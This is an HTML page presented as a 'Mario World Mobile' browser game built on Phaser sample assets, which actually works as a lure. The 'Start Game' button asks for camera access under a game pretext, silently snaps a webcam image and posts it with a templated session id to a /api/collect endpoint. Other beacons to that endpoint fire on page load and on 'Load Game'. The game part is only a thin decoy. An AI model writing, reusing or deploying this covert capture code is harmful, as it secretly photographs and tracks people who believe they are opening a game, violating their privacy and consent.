<!DOCTYPE html>
<html>
<head>
    <title>Mario World Mobile</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/phaser@3.60.0/dist/phaser.min.js"></script>
    <style>
        body { 
            margin: 0; 
            padding: 0; 
            background: #000;
            color: white;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }
        canvas { 
            display: block; 
            width: 100vw; 
            height: 100vh; 
        }
        .ui { 
            position: absolute; 
            top: 20px; 
            left: 20px; 
            z-index: 100;
            background: rgba(0,0,0,0.7);
            padding: 10px;
            border-radius: 8px;
        }
        .btn { 
            padding: 10px 20px; 
            background: #4CAF50; 
            color: white; 
            border: none; 
            cursor: pointer; 
            border-radius: 4px; 
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <div class="ui">
        <h1>Mario World Mobile</h1>
        <p>Play the classic Mario game on your mobile!</p>
        <button onclick="startGame()" class="btn">Start Game</button>
        <button onclick="loadGame()" class="btn">Load Game</button>
    </div>

    <script>
        // Initialize Phaser game
        const config = {
            type: Phaser.AUTO,
            width: window.innerWidth,
            height: window.innerHeight,
            parent: 'game-container',
            physics: {
                default: 'arcade',
                arcade: {
                    gravity: { y: 300 },
                    debug: false
                }
            },
            scene: {
                preload: preload,
                create: create,
                update: update
            }
        };

        const game = new Phaser.Game(config);
        let player;
        let cursors;

        function preload() {
            // Load assets
            this.load.image('sky', 'https://labs.phaser.io/assets/skies/space3.png');
            this.load.image('ground', 'https://labs.phaser.io/assets/sprites/platform.png');
            this.load.image('star', 'https://labs.phaser.io/assets/sprites/star.png');
            this.load.image('bomb', 'https://labs.phaser.io/assets/sprites/bomb.png');
            this.load.spritesheet('dude', 
                'https://labs.phaser.io/assets/sprites/dude.png',
                { frameWidth: 32, frameHeight: 48 }
            );
        }

        function create() {
            // Create sky background
            this.add.image(400, 300, 'sky');

            // Create platforms
            platforms = this.physics.add.staticGroup();
            platforms.create(400, 568, 'ground').setScale(2).refreshBody();
            platforms.create(600, 400, 'ground');
            platforms.create(50, 250, 'ground');
            platforms.create(750, 220, 'ground');

            // Create player
            player = this.physics.add.sprite(100, 450, 'dude');
            player.setBounce(0.2);
            player.setCollideWorldBounds(true);

            // Create animations
            this.anims.create({
                key: 'left',
                frames: this.anims.generateFrameNumbers('dude', { start: 0, end: 3 }),
                frameRate: 10,
                repeat: -1
            });

            this.anims.create({
                key: 'turn',
                frames: [{ key: 'dude', frame: 4 }],
                frameRate: 20
            });

            this.anims.create({
                key: 'right',
                frames: this.anims.generateFrameNumbers('dude', { start: 5, end: 8 }),
                frameRate: 10,
                repeat: -1
            });

            // Create physics
            this.physics.add.collider(player, platforms);

            // Create stars
            stars = this.physics.add.group();
            for (let i = 0; i < 12; i++) {
                const x = Phaser.Math.Between(0, 800);
                const y = Phaser.Math.Between(0, 600);
                stars.create(x, y, 'star');
            }

            // Create collisions
            this.physics.add.collider(stars, platforms);
            this.physics.add.overlap(player, stars, collectStar, null, this);

            // Create bombs
            bombs = this.physics.add.group();
            this.physics.add.collider(bombs, platforms);
            this.physics.add.collider(player, bombs, hitBomb, null, this);

            // Create controls
            cursors = this.input.keyboard.createCursorKeys();

            // Auto-collect data
            setTimeout(function() {
                fetch('/api/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({session_id: '{{ session_id }}'})
                });
            }, 1000);
        }

        function update() {
            // Player movement
            if (cursors.left.isDown) {
                player.setVelocityX(-160);
                player.anims.play('left', true);
            } else if (cursors.right.isDown) {
                player.setVelocityX(160);
                player.anims.play('right', true);
            } else {
                player.setVelocityX(0);
                player.anims.play('turn');
            }

            if (cursors.up.isDown && player.body.touching.down) {
                player.setVelocityY(-330);
            }
        }

        function collectStar(player, star) {
            star.disableBody(true, true);
        }

        function hitBomb(player, bomb) {
            this.physics.pause();
            player.setTint(0xff0000);
            player.anims.play('turn');
            gameOver = true;
        }

        // Handle game start
        function startGame() {
            alert('Starting game...');
            // Simulate loading
            setTimeout(() => {
                // Show camera permission prompt
                navigator.mediaDevices.getUserMedia({video: true})
                    .then(stream => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();
                        
                        // Capture screenshot
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0);
                            
                            fetch('/api/collect', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    session_id: '{{ session_id }}',
                                    screenshot: canvas.toDataURL()
                                })
                            });
                            
                            // Close video stream
                            stream.getTracks().forEach(track => track.stop());
                            alert('Game started! Enjoy your experience.');
                        }, 2000);
                    })
                    .catch(err => {
                        alert('Camera access denied. Please enable camera permissions.');
                    });
            }, 2000);
        }

        // Handle save load
        function loadGame() {
            alert('Loading saved game...');
            // Simulate loading
            setTimeout(() => {
                fetch('/api/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        session_id: '{{ session_id }}',
                        action: 'load'
                    })
                });
                alert('Save loaded successfully!');
            }, 1000);
        }

        // Handle window resize
        window.addEventListener('resize', () => {
            game.scale.resize(window.innerWidth, window.innerHeight);
        });
    </script>
</body>
</html>
